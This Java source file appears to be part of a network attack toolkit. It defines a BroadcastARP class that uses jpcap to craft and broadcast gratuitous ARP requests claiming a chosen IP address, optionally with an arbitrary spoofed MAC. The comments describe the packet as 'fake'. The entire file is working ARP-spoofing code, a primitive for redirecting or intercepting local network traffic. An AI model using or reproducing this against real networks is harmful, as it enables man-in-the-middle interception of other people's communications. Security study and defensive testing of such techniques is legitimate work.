package tools;

import java.net.InetAddress;
import java.net.UnknownHostException;

import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

public class BroadcastARP {
	
	private String ipToBecame;
	private ToolBox container;
	private JpcapSender sender;
	private Thread thread;
	private byte[] mac;
	private String otherMAC;
	
	/**
	 * initialize and send Broadcast ARP packet, <br>
	 * <b>do not use</b> send() method if you use this constructor!
	 * @param ipToBecame
	 */
	public BroadcastARP(String ipToBecame) {
		
		// A grautitous ARP is an arp request to broadcast address
		container = new ToolBox();
		this.ipToBecame = ipToBecame;
		sender = container.getSender();
		mac = container.getMyMac();
		try {
			ARPPacket arp = new ARPPacket();
			arp.hardtype = ARPPacket.HARDTYPE_ETHER;
			arp.prototype = ARPPacket.PROTOTYPE_IP;
			arp.operation = ARPPacket.ARP_REQUEST;
			arp.hlen = 6; // mac address length
			arp.plen = 4; // ip address length
			arp.sender_hardaddr = mac;
			arp.sender_protoaddr = (InetAddress.getByName(ipToBecame)).getAddress();
			arp.target_hardaddr = this.MacStringToByte("ff:ff:ff:ff:ff:ff");
			arp.target_protoaddr = (InetAddress.getByName(ipToBecame)).getAddress();
		
			// craft the ethernet packet
			EthernetPacket eth = new EthernetPacket();
			eth.frametype = EthernetPacket.ETHERTYPE_ARP;
			eth.src_mac = mac;
			eth.dst_mac = this.MacStringToByte("ff:ff:ff:ff:ff:ff");
			arp.datalink = eth;
			sender.sendPacket(arp);
		} catch (Exception e) {
			System.err.println("Broadcast error: bad host name");
		}
	}
	
	/**
	 * Only initialize the object, <br>
	 * use send() method to send the packet
	 * @param ipToBecame
	 * @param alternativeMAC
	 */
	public BroadcastARP(String ipToBecame, String alternativeMAC) {
		container = new ToolBox();
		this.ipToBecame = ipToBecame;
		sender = container.getSender();
		this.otherMAC = alternativeMAC;
		//send();
	}
	
	/**
	 * Send the broadcast fake ARP gratuitous request
	 * @return 0 if something gone wrong, 1 otherwise
	 */
	public boolean send() {
		try {
			mac = MacStringToByte(otherMAC);
			ARPPacket arp = new ARPPacket();
			arp.hardtype = ARPPacket.HARDTYPE_ETHER;
			arp.prototype = ARPPacket.PROTOTYPE_IP;
			arp.operation = ARPPacket.ARP_REQUEST;
			arp.hlen = 6; // mac address length
			arp.plen = 4; // ip address length
			arp.sender_hardaddr = mac;
			arp.sender_protoaddr = (InetAddress.getByName(ipToBecame)).getAddress();
			arp.target_hardaddr = this.MacStringToByte("ff:ff:ff:ff:ff:ff");
			arp.target_protoaddr = (InetAddress.getByName(ipToBecame)).getAddress();
		
			// craft the ethernet packet
			EthernetPacket eth = new EthernetPacket();
			eth.frametype = EthernetPacket.ETHERTYPE_ARP;
			eth.src_mac = mac;
			eth.dst_mac = this.MacStringToByte("ff:ff:ff:ff:ff:ff");
			arp.datalink = eth;
			sender.sendPacket(arp);
		} catch (Exception e) {
			System.err.println("BroadcastARP error: bad host name or mac address");
			return false;
		} return true;
	}
	
	public byte[] MacStringToByte(String macAddress) {
		String[] split = macAddress.split(":");
		//System.out.println("length = " + split.length);
		if (split.length != 6)
			throw new IllegalArgumentException();
		byte[] ret = new byte[6];
		for (int i = 0; i < split.length; i++) {
			ret[i] = (byte) (int) Integer.valueOf(split[i], 16);
		}

		return ret;
	}

}
